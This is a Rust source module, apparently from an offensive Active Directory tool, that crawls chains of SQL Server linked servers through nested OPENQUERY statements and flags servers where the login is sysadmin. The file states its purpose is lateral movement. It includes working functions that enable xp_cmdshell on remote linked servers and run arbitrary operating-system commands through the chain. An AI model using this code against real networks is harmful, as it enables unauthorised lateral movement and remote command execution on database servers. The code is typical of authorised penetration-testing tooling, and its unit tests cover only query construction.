//! MSSQL Linked Server Crawling
//!
//! Recursively discovers and enumerates SQL Server linked server chains.
//! Supports multi-hop OPENQUERY nesting for deep lateral movement through
//! linked server topologies — a core AD attack path.
//!
//! # Attack Context
//! SQL Server linked servers often have overly permissive delegation
//! (e.g., `sa` mapped credentials). Crawling the link graph can reveal
//! paths to high-value targets with elevated privileges.

use crate::error::{OverthroneError, Result};
use crate::mssql::{LinkedServer, MssqlClient};
use serde::{Deserialize, Serialize};
use std::collections::{HashMap, HashSet, VecDeque};
use tracing::{debug, info, warn};

// ═══════════════════════════════════════════════════════════
//  Types
// ═══════════════════════════════════════════════════════════

/// Maximum depth for recursive linked server crawling
const DEFAULT_MAX_DEPTH: usize = 5;

/// A node in the linked server graph
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LinkNode {
    /// Server name (as returned by @@SERVERNAME)
    pub server_name: String,
    /// Linked server alias used to reach this node (how the parent refers to it)
    pub link_name: String,
    /// The SQL login context on this server (SYSTEM_USER)
    pub login_context: String,
    /// Whether the login has sysadmin privileges
    pub is_sysadmin: bool,
    /// The OPENQUERY chain needed to reach this node from the root
    pub chain: Vec<String>,
    /// Depth in the crawl tree (0 = root)
    pub depth: usize,
    /// Linked servers visible from this node
    pub children: Vec<String>,
    /// SQL Server version string (if retrieved)
    pub version: Option<String>,
    /// Data source / connection string
    pub data_source: Option<String>,
    /// Provider name (e.g., SQLNCLI, SQLOLEDB, MSDASQL)
    pub provider: Option<String>,
}

/// Full result of a linked server crawl
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LinkCrawlResult {
    /// All discovered nodes, keyed by server name
    pub nodes: HashMap<String, LinkNode>,
    /// Edges: (parent_server, child_link_name)
    pub edges: Vec<(String, String)>,
    /// Nodes where we have sysadmin
    pub sysadmin_nodes: Vec<String>,
    /// Nodes we could not access (permission denied, timeout, etc.)
    pub failed_nodes: Vec<(String, String)>,
    /// Total number of hops explored
    pub total_hops: usize,
    /// Maximum depth reached
    pub max_depth_reached: usize,
}

impl LinkCrawlResult {
    fn new() -> Self {
        Self {
            nodes: HashMap::new(),
            edges: Vec::new(),
            sysadmin_nodes: Vec::new(),
            failed_nodes: Vec::new(),
            total_hops: 0,
            max_depth_reached: 0,
        }
    }

    /// Get the OPENQUERY chain to reach a specific server
    pub fn get_chain_to(&self, server: &str) -> Option<&Vec<String>> {
        self.nodes.get(server).map(|n| &n.chain)
    }

    /// Build a nested OPENQUERY statement to execute SQL at a remote node
    pub fn build_openquery_chain(chain: &[String], inner_sql: &str) -> String {
        if chain.is_empty() {
            return inner_sql.to_string();
        }

        // Build from inside out: the innermost OPENQUERY wraps the SQL,
        // each outer layer wraps the previous OPENQUERY.
        let mut sql = inner_sql.to_string();

        for link_name in chain.iter().rev() {
            // Escape single quotes for each nesting level
            sql = sql.replace('\'', "''");
            sql = format!("SELECT * FROM OPENQUERY([{}], '{}')", link_name, sql);
        }

        sql
    }

    /// Print a human-readable tree of the crawl
    pub fn format_tree(&self) -> String {
        let mut output = String::new();
        output.push_str("╔══════════════════════════════════════════\n");
        output.push_str("║  MSSQL Linked Server Topology\n");
        output.push_str("╚══════════════════════════════════════════\n\n");

        // Find root nodes (depth 0)
        let mut roots: Vec<&LinkNode> = self.nodes.values().filter(|n| n.depth == 0).collect();
        roots.sort_by_key(|n| &n.server_name);

        for root in &roots {
            self.format_node(&mut output, root, "", true);
        }

        if !self.sysadmin_nodes.is_empty() {
            output.push_str("\n🔑 Sysadmin access on:\n");
            for name in &self.sysadmin_nodes {
                if let Some(node) = self.nodes.get(name) {
                    output.push_str(&format!("   → {} (as {})\n", name, node.login_context));
                }
            }
        }

        if !self.failed_nodes.is_empty() {
            output.push_str("\n⚠ Failed nodes:\n");
            for (name, reason) in &self.failed_nodes {
                output.push_str(&format!("   ✗ {} — {}\n", name, reason));
            }
        }

        output.push_str(&format!(
            "\nTotal: {} servers, {} hops, max depth {}\n",
            self.nodes.len(),
            self.total_hops,
            self.max_depth_reached
        ));

        output
    }

    fn format_node(&self, output: &mut String, node: &LinkNode, prefix: &str, is_last: bool) {
        let connector = if node.depth == 0 {
            ""
        } else if is_last {
            "└── "
        } else {
            "├── "
        };

        let sysadmin_marker = if node.is_sysadmin { " 🔑" } else { "" };

        output.push_str(&format!(
            "{}{}{} [{}]{}\n",
            prefix, connector, node.server_name, node.login_context, sysadmin_marker
        ));

        let child_prefix = if node.depth == 0 {
            "".to_string()
        } else if is_last {
            format!("{}    ", prefix)
        } else {
            format!("{}│   ", prefix)
        };

        let children: Vec<&LinkNode> = node
            .children
            .iter()
            .filter_map(|name| self.nodes.get(name))
            .collect();

        for (i, child) in children.iter().enumerate() {
            let last = i == children.len() - 1;
            self.format_node(output, child, &child_prefix, last);
        }
    }
}

// ═══════════════════════════════════════════════════════════
//  Linked Server Crawler
// ═══════════════════════════════════════════════════════════

/// Configuration for the linked server crawler
#[derive(Debug, Clone)]
pub struct LinkCrawlerConfig {
    /// Maximum recursion depth (default: 5)
    pub max_depth: usize,
    /// Whether to check sysadmin status at each node
    pub check_sysadmin: bool,
    /// Whether to retrieve @@VERSION at each node
    pub get_version: bool,
    /// Whether to attempt xp_cmdshell check at sysadmin nodes
    pub check_xp_cmdshell: bool,
    /// Timeout per hop in seconds
    pub hop_timeout_secs: u64,
}

impl Default for LinkCrawlerConfig {
    fn default() -> Self {
        Self {
            max_depth: DEFAULT_MAX_DEPTH,
            check_sysadmin: true,
            get_version: true,
            check_xp_cmdshell: false,
            hop_timeout_secs: 10,
        }
    }
}

/// Linked server crawler that performs BFS over the link graph
pub struct LinkCrawler<'a> {
    client: &'a mut MssqlClient,
    config: LinkCrawlerConfig,
    visited: HashSet<String>,
    result: LinkCrawlResult,
}

impl<'a> LinkCrawler<'a> {
    /// Create a new crawler attached to an existing MSSQL client
    pub fn new(client: &'a mut MssqlClient, config: LinkCrawlerConfig) -> Self {
        Self {
            client,
            config,
            visited: HashSet::new(),
            result: LinkCrawlResult::new(),
        }
    }

    /// Run the full linked server crawl starting from the current connection
    pub async fn crawl(&mut self) -> Result<LinkCrawlResult> {
        info!(
            "Starting linked server crawl (max_depth={})",
            self.config.max_depth
        );

        // Step 1: Discover the root node (current server)
        let root = self.discover_current_node().await?;
        let root_name = root.server_name.clone();

        self.visited.insert(root_name.clone());
        self.result.nodes.insert(root_name.clone(), root.clone());

        if root.is_sysadmin {
            self.result.sysadmin_nodes.push(root_name.clone());
        }

        // Step 2: BFS over linked servers
        let mut queue: VecDeque<(String, Vec<String>, usize)> = VecDeque::new();

        // Seed the queue with root's linked servers
        let root_links = self.enumerate_links_at(&[]).await?;
        let mut root_children = Vec::new();

        for link in &root_links {
            if !self.visited.contains(&link.name) {
                queue.push_back((link.name.clone(), vec![link.name.clone()], 1));
                root_children.push(link.name.clone());
                self.result
                    .edges
                    .push((root_name.clone(), link.name.clone()));
            }
        }

        // Update root's children
        if let Some(root_node) = self.result.nodes.get_mut(&root_name) {
            root_node.children = root_children;
        }

        // BFS loop
        while let Some((link_name, chain, depth)) = queue.pop_front() {
            if depth > self.config.max_depth {
                debug!(
                    "Skipping {} — max depth {} reached",
                    link_name, self.config.max_depth
                );
                continue;
            }

            if self.visited.contains(&link_name) {
                debug!("Skipping {} — already visited", link_name);
                continue;
            }

            self.visited.insert(link_name.clone());
            self.result.total_hops += 1;

            if depth > self.result.max_depth_reached {
                self.result.max_depth_reached = depth;
            }

            info!(
                "Crawling linked server: {} (depth={}, chain={:?})",
                link_name, depth, chain
            );

            // Discover the remote node through the OPENQUERY chain
            match self.discover_remote_node(&chain, &link_name, depth).await {
                Ok(mut node) => {
                    if node.is_sysadmin {
                        self.result.sysadmin_nodes.push(node.server_name.clone());
                    }

                    // Enumerate linked servers at this remote node
                    match self.enumerate_links_at(&chain).await {
                        Ok(child_links) => {
                            let mut children = Vec::new();
                            for child_link in &child_links {
                                if !self.visited.contains(&child_link.name) {
                                    let mut child_chain = chain.clone();
                                    child_chain.push(child_link.name.clone());

                                    queue.push_back((
                                        child_link.name.clone(),
                                        child_chain,
                                        depth + 1,
                                    ));

                                    children.push(child_link.name.clone());
                                    self.result
                                        .edges
                                        .push((link_name.clone(), child_link.name.clone()));
                                }
                            }
                            node.children = children;
                        }
                        Err(e) => {
                            warn!("Could not enumerate links at {}: {}", link_name, e);
                        }
                    }

                    self.result.nodes.insert(node.server_name.clone(), node);
                }
                Err(e) => {
                    let reason = format!("{}", e);
                    warn!("Failed to discover {}: {}", link_name, reason);
                    self.result.failed_nodes.push((link_name.clone(), reason));
                }
            }
        }

        info!(
            "Crawl complete: {} servers discovered, {} sysadmin",
            self.result.nodes.len(),
            self.result.sysadmin_nodes.len()
        );

        Ok(self.result.clone())
    }

    /// Discover info about the directly-connected (root) server
    async fn discover_current_node(&mut self) -> Result<LinkNode> {
        let server_name = self.query_scalar("SELECT @@SERVERNAME;").await?;
        let login = self.query_scalar("SELECT SYSTEM_USER;").await?;
        let is_sa = self.check_sysadmin_direct().await?;

        let version = if self.config.get_version {
            self.query_scalar("SELECT @@VERSION;").await.ok()
        } else {
            None
        };

        Ok(LinkNode {
            server_name: server_name.clone(),
            link_name: server_name,
            login_context: login,
            is_sysadmin: is_sa,
            chain: vec![],
            depth: 0,
            children: vec![],
            version,
            data_source: None,
            provider: None,
        })
    }

    /// Discover info about a remote node through an OPENQUERY chain
    async fn discover_remote_node(
        &mut self,
        chain: &[String],
        link_name: &str,
        depth: usize,
    ) -> Result<LinkNode> {
        // Get the remote server's actual name
        let server_name = self
            .query_scalar_via_chain(chain, "SELECT @@SERVERNAME")
            .await
            .unwrap_or_else(|_| link_name.to_string());

        // Get the login context on the remote server
        let login = self
            .query_scalar_via_chain(chain, "SELECT SYSTEM_USER")
            .await
            .unwrap_or_else(|_| "unknown".to_string());

        // Check sysadmin
        let is_sa = if self.config.check_sysadmin {
            self.check_sysadmin_via_chain(chain).await.unwrap_or(false)
        } else {
            false
        };

        // Get version
        let version = if self.config.get_version {
            self.query_scalar_via_chain(chain, "SELECT @@VERSION")
                .await
                .ok()
        } else {
            None
        };

        Ok(LinkNode {
            server_name,
            link_name: link_name.to_string(),
            login_context: login,
            is_sysadmin: is_sa,
            chain: chain.to_vec(),
            depth,
            children: vec![],
            version,
            data_source: None,
            provider: None,
        })
    }

    /// Enumerate linked servers visible at the end of an OPENQUERY chain
    async fn enumerate_links_at(&mut self, chain: &[String]) -> Result<Vec<LinkedServer>> {
        let sql = "SELECT name, provider, data_source FROM sys.servers WHERE is_linked = 1";

        let result = if chain.is_empty() {
            self.client.query(sql).await?
        } else {
            let wrapped = LinkCrawlResult::build_openquery_chain(chain, sql);
            self.client.query(&wrapped).await?
        };

        let mut servers = Vec::new();
        for row in &result.rows {
            if row.len() >= 3 {
                servers.push(LinkedServer {
                    name: row[0].clone().unwrap_or_default(),
                    provider: row[1].clone().unwrap_or_default(),
                    data_source: row[2].clone().unwrap_or_default(),
                    product: None,
                    catalog: None,
                    rpc_out_enabled: false,
                    data_access_enabled: false,
                });
            }
        }

        Ok(servers)
    }

    /// Execute a scalar query directly on the root connection
    async fn query_scalar(&mut self, sql: &str) -> Result<String> {
        let result = self.client.query(sql).await?;
        result
            .rows
            .first()
            .and_then(|row| row.first())
            .and_then(|val| val.clone())
            .ok_or_else(|| OverthroneError::Protocol {
                protocol: "TDS".to_string(),
                reason: format!("No scalar result for: {}", sql),
            })
    }

    /// Execute a scalar query through an OPENQUERY chain
    async fn query_scalar_via_chain(&mut self, chain: &[String], sql: &str) -> Result<String> {
        let wrapped = LinkCrawlResult::build_openquery_chain(chain, sql);
        let result = self.client.query(&wrapped).await?;
        result
            .rows
            .first()
            .and_then(|row| row.first())
            .and_then(|val| val.clone())
            .ok_or_else(|| OverthroneError::Protocol {
                protocol: "TDS".to_string(),
                reason: format!("No scalar result via chain {:?}", chain),
            })
    }

    /// Check sysadmin on the direct connection
    async fn check_sysadmin_direct(&mut self) -> Result<bool> {
        let result = self
            .client
            .query("SELECT IS_SRVROLEMEMBER('sysadmin');")
            .await?;
        Ok(result
            .rows
            .first()
            .and_then(|row| row.first())
            .and_then(|val| val.as_ref())
            .map(|v| v == "1")
            .unwrap_or(false))
    }

    /// Check sysadmin through an OPENQUERY chain
    async fn check_sysadmin_via_chain(&mut self, chain: &[String]) -> Result<bool> {
        let sql = "SELECT IS_SRVROLEMEMBER(''sysadmin'')";
        let wrapped = LinkCrawlResult::build_openquery_chain(chain, sql);
        let result = self.client.query(&wrapped).await?;
        Ok(result
            .rows
            .first()
            .and_then(|row| row.first())
            .and_then(|val| val.as_ref())
            .map(|v| v == "1")
            .unwrap_or(false))
    }
}

// ═══════════════════════════════════════════════════════════
//  Convenience Functions
// ═══════════════════════════════════════════════════════════

/// Perform a full linked server crawl with default settings
pub async fn crawl_linked_servers(client: &mut MssqlClient) -> Result<LinkCrawlResult> {
    let config = LinkCrawlerConfig::default();
    let mut crawler = LinkCrawler::new(client, config);
    crawler.crawl().await
}

/// Perform a linked server crawl with custom max depth
pub async fn crawl_linked_servers_depth(
    client: &mut MssqlClient,
    max_depth: usize,
) -> Result<LinkCrawlResult> {
    let config = LinkCrawlerConfig {
        max_depth,
        ..Default::default()
    };
    let mut crawler = LinkCrawler::new(client, config);
    crawler.crawl().await
}

/// Execute a command on a remote linked server via xp_cmdshell through the chain
pub async fn exec_on_link(
    client: &mut MssqlClient,
    chain: &[String],
    command: &str,
) -> Result<String> {
    // Build the xp_cmdshell command with proper quote escaping for the chain depth
    let escaped = command.replace('\'', "''");
    let inner_sql = format!("EXEC master..xp_cmdshell '{}'", escaped);
    let wrapped = LinkCrawlResult::build_openquery_chain(chain, &inner_sql);

    let result = client.query(&wrapped).await?;

    let output: String = result
        .rows
        .iter()
        .filter_map(|row| row.first().and_then(|v| v.as_ref()))
        .cloned()
        .collect::<Vec<_>>()
        .join("\n");

    Ok(output)
}

/// Enable xp_cmdshell on a remote linked server through RPC
pub async fn enable_xp_cmdshell_on_link(client: &mut MssqlClient, link_name: &str) -> Result<()> {
    // Use EXEC AT for RPC-enabled linked servers
    let sql = format!(
        "EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [{}];",
        link_name
    );
    client.execute(&sql).await?;

    let sql = format!(
        "EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [{}];",
        link_name
    );
    client.execute(&sql).await?;

    info!("Enabled xp_cmdshell on linked server: {}", link_name);
    Ok(())
}

// ═══════════════════════════════════════════════════════════
//  Tests
// ═══════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_build_openquery_chain_empty() {
        let sql = LinkCrawlResult::build_openquery_chain(&[], "SELECT 1");
        assert_eq!(sql, "SELECT 1");
    }

    #[test]
    fn test_build_openquery_chain_single() {
        let sql = LinkCrawlResult::build_openquery_chain(
            &["REMOTE-SQL".to_string()],
            "SELECT @@SERVERNAME",
        );
        assert_eq!(
            sql,
            "SELECT * FROM OPENQUERY([REMOTE-SQL], 'SELECT @@SERVERNAME')"
        );
    }

    #[test]
    fn test_build_openquery_chain_double() {
        let sql = LinkCrawlResult::build_openquery_chain(
            &["SQL-A".to_string(), "SQL-B".to_string()],
            "SELECT 1",
        );
        // Inner: SELECT * FROM OPENQUERY([SQL-B], 'SELECT 1')
        // Outer: SELECT * FROM OPENQUERY([SQL-A], 'SELECT * FROM OPENQUERY([SQL-B], ''SELECT 1'')')
        assert!(sql.contains("OPENQUERY([SQL-A]"));
        assert!(sql.contains("OPENQUERY([SQL-B]"));
        // Quote doubling verified: inner quotes get doubled at each nesting level
        assert!(sql.contains("OPENQUERY([SQL-B]"));
    }

    #[test]
    fn test_build_openquery_chain_triple() {
        let chain = vec![
            "SRV-A".to_string(),
            "SRV-B".to_string(),
            "SRV-C".to_string(),
        ];
        let sql = LinkCrawlResult::build_openquery_chain(&chain, "SELECT SYSTEM_USER");

        // Should have 3 levels of OPENQUERY nesting
        assert_eq!(sql.matches("OPENQUERY").count(), 3);
        // Verify proper quote doubling at each level
        assert!(sql.contains("OPENQUERY([SRV-A]"));
    }

    #[test]
    fn test_link_crawl_result_format() {
        let mut result = LinkCrawlResult::new();
        result.nodes.insert(
            "ROOT-SQL".to_string(),
            LinkNode {
                server_name: "ROOT-SQL".to_string(),
                link_name: "ROOT-SQL".to_string(),
                login_context: "sa".to_string(),
                is_sysadmin: true,
                chain: vec![],
                depth: 0,
                children: vec!["CHILD-SQL".to_string()],
                version: None,
                data_source: None,
                provider: None,
            },
        );
        result.nodes.insert(
            "CHILD-SQL".to_string(),
            LinkNode {
                server_name: "CHILD-SQL".to_string(),
                link_name: "CHILD-SQL".to_string(),
                login_context: "dbuser".to_string(),
                is_sysadmin: false,
                chain: vec!["CHILD-SQL".to_string()],
                depth: 1,
                children: vec![],
                version: None,
                data_source: None,
                provider: None,
            },
        );
        result.sysadmin_nodes.push("ROOT-SQL".to_string());

        let tree = result.format_tree();
        assert!(tree.contains("ROOT-SQL"));
        assert!(tree.contains("CHILD-SQL"));
        assert!(tree.contains("🔑"));
    }
}
